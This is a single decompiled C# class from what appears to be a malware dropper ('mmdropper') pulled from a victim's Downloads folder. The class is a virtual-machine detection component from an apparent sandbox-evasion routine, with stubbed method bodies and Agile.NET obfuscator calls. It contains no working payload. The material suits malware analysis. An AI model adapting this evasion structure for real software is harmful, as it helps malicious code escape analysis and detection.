// Decompiled with JetBrains decompiler
// Type: VirtualPcMachine
// Assembly: mmdropper, Version=1.0.7321.42228, Culture=neutral, PublicKeyToken=null
// MVID: 67C14436-991D-42DC-A31E-001F369439CC
// Assembly location: C:\Users\victim\Downloads\Release-1.0\eulascr-cleanstrings.exe

using System.Collections.Generic;
using System.Runtime.CompilerServices;

#nullable disable
internal class VirtualPcMachine : BaseVirtualEnvironment
{
  public override string Name
  {
    [MethodImpl(MethodImplOptions.NoInlining)] get => (string) null;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public override bool ContainsProcess(IEnumerable<string> services) => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public VirtualPcMachine()
  {
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static VirtualPcMachine()
  {
    \u003CAgileDotNetRT\u003E.Initialize();
    \u003CAgileDotNetRT\u003E.PostInitialize();
  }
}
